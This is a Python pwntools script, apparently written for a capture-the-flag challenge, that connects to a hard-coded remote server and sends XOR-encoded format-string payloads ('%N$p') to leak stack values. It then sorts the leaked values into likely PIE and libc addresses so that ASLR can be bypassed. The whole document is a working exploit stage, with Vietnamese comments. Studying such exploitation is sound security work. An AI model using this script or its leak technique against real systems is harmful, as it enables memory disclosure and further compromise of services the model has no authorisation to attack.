from pwn import *

# --- CẤU HÌNH ---
context.log_level = 'error' # Tắt log rác
HOST = '18.212.136.134'
PORT = 8887

# Kết nối server
p = remote(HOST, PORT)

# Key ban đầu
current_key = b'\xff' * 32

def xor(s1, s2):
    return bytes([a ^ b for a, b in zip(s1, s2)])

def get_leak(start_idx):
    global current_key
    
    # Tạo payload leak 5 ô liên tiếp: %k$p|%k+1$p|...
    payload = ""
    for i in range(start_idx, start_idx + 5):
        payload += f"%{i}$p|"
    
    payload = payload[:-1].encode() # Bỏ dấu | cuối
    payload = payload.ljust(32, b'\x00')
    
    try:
        # Gửi lựa chọn 1
        p.sendlineafter(b'>> ', b'1', timeout=3)
        
        # Gửi payload XOR
        to_send = xor(payload, current_key)
        p.send(to_send)
        
        # Cập nhật key
        current_key = payload
        
        # Nhận kết quả
        res = p.recvuntil(b'1. Keep', drop=True).strip()
        return res.split(b'|')
    except:
        return [b'(error)'] * 5

print(f"[*] Đang quét Stack trên Server {HOST}:{PORT}...")
print(f"{'OFF':<4} | {'VALUE':<18} | {'DỰ ĐOÁN'}")
print("-" * 45)

# Quét từ offset 1 đến 50
for i in range(1, 51, 5):
    leaks = get_leak(i)
    for j, val in enumerate(leaks):
        idx = i + j
        val_str = val.decode()
        note = ""
        
        if val_str == '(nil)' or val_str == '(error)':
            continue
            
        # 1. Tìm PIE (Code Binary)
        # Trên remote, code thường bắt đầu bằng 0x5... hoặc 0x6...
        # Và quan trọng là 3 số cuối thường cố định. Main là ...2f4
        if val_str.endswith('2f4'): 
            note = "<-- PIE (MAIN) ???"
        
        # 2. Tìm Libc
        # Trên remote, libc thường bắt đầu bằng 0x7f...
        # Các đuôi phổ biến: ...18a, ...2ca (Debian)
        elif val_str.startswith('0x7f'):
            # Loại bỏ stack (thường rất cao, vd 0x7ffc...)
            # Libc thường thấp hơn stack một chút
            if val_str[4] != 'f': # 0x7fX... mà X không phải f
                 note = "<-- LIBC ???"
            elif val_str.endswith('18a') or val_str.endswith('2ca') or val_str.endswith('c29'):
                 note = "<-- LIBC (Debian) ???"
            else:
                 note = "Stack/Libc"

        print(f"{idx:<4} | {val_str:<18} | {note}")

p.close()